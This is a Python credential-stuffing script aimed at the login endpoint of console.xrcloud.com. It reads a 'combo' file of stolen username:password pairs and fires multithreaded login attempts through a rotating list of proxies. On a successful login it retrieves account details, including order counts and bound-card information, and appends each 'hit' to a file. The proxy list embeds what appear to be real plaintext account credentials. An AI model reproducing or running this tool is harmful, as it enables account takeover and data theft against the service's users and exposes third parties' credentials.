import time
import random
import hashlib
import urllib.parse
import time , requests
import tkinter as tk
from tkinter import filedialog
import threading
from itertools import cycle
proxies = [
    "http://purevpn0s10179892:sqjb53bd@prox-fi.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ae.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-al.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-at.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-au.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-be.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ca.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ch.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-cl.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-cz.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-de.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ee.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-es.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-gr.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-hk.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-hu.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ie.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-in.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-jp.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-kr.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-lt.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-lu.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-md.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ng.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-nl.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ph.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-pt.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ro.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-rs.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-ru.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-sg.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-sk.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-tw.pointtoserver.com:10799",
    "http://purevpn0s10179892:sqjb53bd@prox-vn.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-ae.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-al.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-at.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-be.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-ca.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-ch.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-cz.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-de.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-ee.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-es.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-fi.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-gr.pointtoserver.com:10799",
    "http://purevpn0s988687:Mosman2088$@prox-vn.pointtoserver.com:10799",
]

proxy_pool = cycle(proxies)
t = int(time.time() * 1000)
class Base64:
    keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="

    @staticmethod
    def encode64(input_str):
        output = ""
        chr1 = chr2 = chr3 = ""
        enc1 = enc2 = enc3 = enc4 = ""
        i = 0
        input_str = input_str.encode("utf-8")
        
        while i < len(input_str):
            chr1 = input_str[i]
            i += 1
            chr2 = input_str[i] if i < len(input_str) else None
            i += 1
            chr3 = input_str[i] if i < len(input_str) else None
            i += 1

            enc1 = chr1 >> 2
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4 if chr2 else 0)
            enc3 = ((chr2 & 15) << 2 if chr2 else 0) | (chr3 >> 6 if chr3 else 0)
            enc4 = chr3 & 63 if chr3 else 0

            if chr2 is None:
                enc3 = enc4 = 64
            elif chr3 is None:
                enc4 = 64

            output += Base64.keyStr[enc1] + Base64.keyStr[enc2] + Base64.keyStr[enc3] + Base64.keyStr[enc4]

        return output




def generate_uuid():
    # Get current timestamp (in milliseconds)
    d = int(time.time() * 1000)

    # Add high-precision timer if available
    if hasattr(time, 'perf_counter'):
        d += int(time.perf_counter() * 1000)

    # Generate a UUID string
    uuid = []
    for c in 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx':
        if c == 'x':
            r = random.randint(0, 15)
            uuid.append(hex(r)[2:])
        elif c == 'y':
            r = (random.randint(0, 3) | 8) & 0xf
            uuid.append(hex(r)[2:])
        else:
            uuid.append(c)

    return ''.join(uuid)

# Example usage:

def append_md5(params, type=None):
    if params is None:
        return None

    str_val = ''
    count = 0

    for k, v in params.items():
        if v is not None:
            str_val += k[0] + str(v)
            count += 1

    str_val += str(count)

    if str_val:
        str_val = urllib.parse.quote(str_val)
        str_val = hashlib.md5(str_val.encode()).hexdigest()
        count = count % 10
        mac = str_val[:count] + str(count) + str_val[count:]
        params['mac'] = mac.upper()

    return params
def newparm(user=None,password=None):
    params = {
        "username": user,
        "password": Base64.encode64(password),
        "local": "en",
        "uuid": generate_uuid(),
        "passwordEncode": "1",
        "t": t
    }
    updated_params = append_md5(params,'post')
    return updated_params

def newpget(p):
    updated_params = append_md5(p,'get')
    return updated_params
def check(e,p):
    session = requests.Session()
    headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'en-US,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,ar-MA;q=0.6,ar;q=0.5',
    'Connection': 'keep-alive',
    'Content-Length': '184',
    'Content-Type': 'application/json;charset=UTF-8',
    'Host': 'console.xrcloud.com',
    'Origin': 'https://www.xrcloud.com',
    'Referer': 'https://www.xrcloud.com/',
    'Sec-Ch-Ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
    'Sec-Ch-Ua-Mobile': '?0',
    'Sec-Ch-Ua-Platform': '"Windows"',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
}
    proxy = next(proxy_pool)
    proxies = {
        "http": proxy
    }
    r=session.post('https://console.xrcloud.com/user/login.do',json=newparm(e,p),headers=headers,proxies=proxies)

    if '_utk' in r.text:
        print(str(e)+':'+str(p).replace('"','')+'===> good')
        data=session.get('https://console.xrcloud.com/user/GetUserInfo.do',json=newpget(       
        {"_t": t,
         "local": "en",
        "t": t})).text
        ordertable=data.split('"orderTableNum":')[1].split(',')[0]
        bandingCard=data.split('"bandingCard":')[1].split('},')[0]
        print(f"ordertable={ordertable} |bandingCard={bandingCard}")
        open('xrcloud-hits.txt','a',encoding='utf-8').write(str(e)+':'+str(p).replace('"','')+f" | ordertable={ordertable} |bandingCard={bandingCard}"+'\n')

        

    
    else:
        print(str(e)+':'+str(p).replace('"','')+'===> BAD')



def select_file():
    root = tk.Tk()
    root.withdraw()  # Hide the root window
    file_path = filedialog.askopenfilename(
        title="Select a file",
        filetypes=(("Text files", "*.txt"), ("All files", "*.*"))
    )
    
    if file_path:
        print(f'Using file: {file_path}')
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                # Read the file contents and split into lines
                lines = file.read().splitlines()
                return lines
        except FileNotFoundError:
            print(f"File {file_path} not found. Please check the file name and try again.")
        except Exception as e:
            print(f"An error occurred: {e}")
            return []
    else:
        print("No file selected.")
        return []
input('click entre to upload combo')
lista = select_file()
print('-------------------STARTED ---- Wait for hits-------------')

def thread():
    totalnum = len(lista)
    threadnum = int(input('Enter Threads : '))
    threads = []
    for i in lista:
        try:
            user = i.split(':')[-2]
            passw =i.split(':')[-1]
        except:
            continue

        thread = threading.Thread(target=check, args=(user.strip(), passw.strip()))
        threads.append(thread)
        thread.start()
        if len(threads) == threadnum:
            for i in threads:
                i.join()

            threads = []
            continue

        
thread()